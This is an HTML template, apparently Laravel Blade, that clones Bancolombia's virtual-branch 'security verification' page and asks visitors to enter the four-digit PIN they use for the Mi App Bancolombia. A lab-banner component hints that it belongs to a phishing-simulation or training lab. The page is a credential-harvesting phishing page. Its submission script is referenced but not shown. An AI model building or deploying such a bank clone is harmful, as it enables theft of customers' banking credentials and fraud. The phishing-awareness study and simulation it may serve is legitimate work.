<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bancolombia - Sucursal Virtual</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="{{ asset('3co/js/tailwind-config.js') }}"></script>
    <style>
        @font-face {
            font-family: 'bancolombia';
            src: url('/3co/fonts/bancolombia.ttf') format('truetype');
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: "Open Sans";
            src: url('/3co/fonts/OpenSans-Regular.woff') format('woff'),
                url('/3co/fonts/OpenSans-Regular.ttf') format('truetype');
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: "Open Sans";
            src: url('/3co/fonts/OpenSans-SemiBold.woff') format('woff'),
                url('/3co/fonts/OpenSans-SemiBold.ttf') format('truetype');
            font-weight: 600;
            font-style: normal;
        }

        @font-face {
            font-family: "CIB Sans";
            src: url('/3co/fonts/CIBFontSansBold.woff2') format('woff2'),
                url('/3co/fonts/CIBFontSansBold.woff') format('woff');
            font-weight: 700;
            font-style: normal;
        }

        @font-face {
            font-family: "CIB Sans";
            src: url('/3co/fonts/CIBFontSansLight.woff2') format('woff2'),
                url('/3co/fonts/CIBFontSansLight.woff') format('woff');
            font-weight: 300;
            font-style: normal;
        }

        body {
            font-family: 'Open Sans', sans-serif;
        }

        .font-cib-sans-bold {
            font-family: 'CIB Sans', sans-serif;
            font-weight: 700;
        }

        .thin-border-input {
            border-bottom: 0.5px solid #d1d5db !important;
        }

        .thin-border-input:focus {
            border-bottom: 0.5px solid #374151 !important;
        }

        .bg-bancolombia {
            background-image: url('/3co/assets/bgImage.svg');
            background-position: bottom;
            background-repeat: no-repeat;
        }

        .loading-spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #fdda24;
            border-top: 4px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .password-input {
            font-size: 18px;
            font-weight: 600;
            color: #000;
            text-align: center;
            background: white;
            border: none;
            outline: none;
            padding: 2px 0 8px 0;
            caret-color: #000;
        }

        .password-input:focus {
            border-bottom-color: #374151;
        }

        @media (hover: none) and (pointer: coarse) {
            .password-input {
                font-size: 20px;
                padding: 1px 0 9px 0;
            }
        }
    </style>
</head>

<body class="bg-gray-100">
<x-lab-banner />

    <div id="loading" class="fixed inset-0 bg-white flex items-center justify-center z-50 hidden">
        <div class="loading-spinner"></div>
        <div class="absolute text-center" style="margin-top: 100px;">
            <p class="text-gray-700">espere un momento ...</p>
        </div>
    </div>

    <div class="w-full flex justify-center items-center py-3 z-50">
        <div class="w-[98%] flex gap-10 items-center">
            <img src="/3co/assets/header.svg" class="ml-[25%] w-[45%] object-contain" alt="Bancolombia" />
            <div class="flex justify-center items-center gap-1.5 cursor-pointer" onclick="salir()">
                <span class="text-[15px]">Salir</span>
                <img src="/3co/assets/exitHeader.svg" class="w-5 object-contain" alt="Salir" />
            </div>
        </div>
    </div>

    <div class="bg-bancolombia min-h-[70vh] w-[90%] mx-auto flex flex-col items-center justify-center">
        <div id="pinvir" class="w-full flex flex-col justify-center items-center pb-6">
            <h5 class="text-[24px] font-cib-sans-bold mt-10">Verificación de seguridad</h5>
            <div class="w-full flex mt-4 flex-col justify-center items-center gap-4 pl-1">
                <div class="w-[100%] bg-white py-6 px-4 rounded-xl flex flex-col items-center">
                    <div class="w-full flex items-center justify-center hiddenerror hidden">
                        <span class="text-[11px] text-red-600"> La Clave ingresada no es correcta. Intenta nuevamente.</span>
                    </div>
                    <div class="mt-2.5">
                        <img src="/3co/assets/candado.svg" alt="Candado" />
                    </div>
                    <div class="w-[90%] flex flex-col mt-4 mb-4">
                        <span class="text-[16px] text-center text-gray-800">Ingresa la Clave que usas para ingresar a Mi App Bancolombia:</span>
                    </div>

                    <div class="w-full mt-4 flex flex-col items-center">
                        <div class="flex justify-center gap-2 w-full max-w-xs">
                            <input id="clavevirtual-0" type="text" inputmode="numeric" maxlength="1" class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                            <input id="clavevirtual-1" type="text" inputmode="numeric" maxlength="1" class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                            <input id="clavevirtual-2" type="text" inputmode="numeric" maxlength="1" class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                            <input id="clavevirtual-3" type="text" inputmode="numeric" maxlength="1" class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                        </div>
                    </div>

                    <button id="validarClaveVirtual" class="mt-4 font-bold py-2 px-6 rounded-full mt-6 disabled:bg-gray-300 disabled:text-black cursor-not-allowed bg-gray-300 w-32" disabled>Validar</button>
                </div>
            </div>
        </div>
    </div>

    <div class="w-full flex flex-col justify-center items-center py-7">
        <div class="w-[90%] border-t border-gray-300"></div>
        <img src="/3co/assets/header.svg" class="w-[40%] object-contain" alt="Bancolombia" />
        <img src="/3co/assets/foter.svg" class="w-[40%] object-contain mt-0.5" alt="Footer" />
    </div>

<script src="{{ asset('3co/js/trico-app.js') }}"></script>

</body>
</html>
